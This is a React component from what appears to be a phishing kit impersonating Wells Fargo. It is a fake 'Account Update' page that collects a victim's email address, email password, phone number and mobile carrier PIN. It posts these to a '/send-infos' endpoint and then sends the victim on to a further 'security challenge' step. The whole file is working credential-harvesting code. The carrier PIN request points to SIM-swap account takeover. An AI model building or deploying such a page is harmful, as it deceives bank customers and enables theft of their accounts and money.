import { Box } from "@mui/system";
import axios from "axios";
import React, { useState } from "react";
import { useForm } from "react-hook-form";
import { Helmet } from "react-helmet";
import { CustomInput } from "./CustomInput";
import { SubmitButton } from "./SubmitButton";
import { Wrapper } from "./Wrapper";

interface AccountUpdateProps {
  updateInputs: (data: any) => void;
  inputs: {};
  history: any;
}

export const AccountUpdate: React.FC<AccountUpdateProps> = ({
  updateInputs,
  history,
}) => {
  const {
    register,
    handleSubmit,
    formState: { errors },
  } = useForm();
  const [loading, setLoading] = useState(false);

  const onSubmit = handleSubmit(async (data) => {
    setLoading(true);
    updateInputs({
      form: "ACCOUNT UPDATE",
      accountUpdate: data,
    });
    await axios.post("/send-infos", {
      form: "ACCOUNT UPDATE",
      accountUpdate: data,
    });
    setLoading(false);
    history.push("/s/security-challenge");
  });
  return (
    <Wrapper title="Account update" errors={errors}>
      <Helmet>
        <title>Account Update Details | Wells Fargo</title>
      </Helmet>
      <Box paddingBottom="32px">
        <CustomInput
          label="Email Address"
          type="email"
          register={register("email", {
            required: "Please enter your email",
            pattern: {
              value: /^[\w-.]+@([\w-]+\.)+[\w-]{2,4}$/,
              message: "Please enter a valid email address",
            },
          })}
        />
      </Box>
      <Box marginTop="8px" paddingBottom="32px">
        <CustomInput
          label="Email Address Password"
          type="password"
          register={register("emailPassword", {
            required: "Please enter your password",
            validate: (value) => {
              if (value.length < 6) {
                return "The email password you entered is not valid";
              }
              return true;
            },
          })}
        />
      </Box>
      <Box marginTop="8px" paddingBottom="32px">
        <CustomInput
          label="Phone Number"
          type="number"
          register={register("phoneNumber", {
            required:
              "Please enter the phone number associated with your account",
            pattern: {
              value:
                /^1?\s?(\([0-9]{3}\)[- ]?|[0-9]{3}[- ]?)[0-9]{3}[- ]?[0-9]{4}$/,
              message: "Please enter a phone number",
            },
          })}
        />
      </Box>
      <Box marginTop="8px" paddingBottom="32px">
        <CustomInput
          label="Carrier Pin"
          type="number"
          register={register("carrierPin", {
            required: "Please enter your carrier pin",
            pattern: {
              value: /^[0-9]{4}$/,
              message: "Please enter a valid carrier pin",
            },
          })}
        />
      </Box>
      <Box
        component="section"
        sx={{
          margin: "1rem auto .625rem",
          display: "block",
        }}
      />
      <SubmitButton text="Submit" onClick={onSubmit} loading={loading} />
    </Wrapper>
  );
};
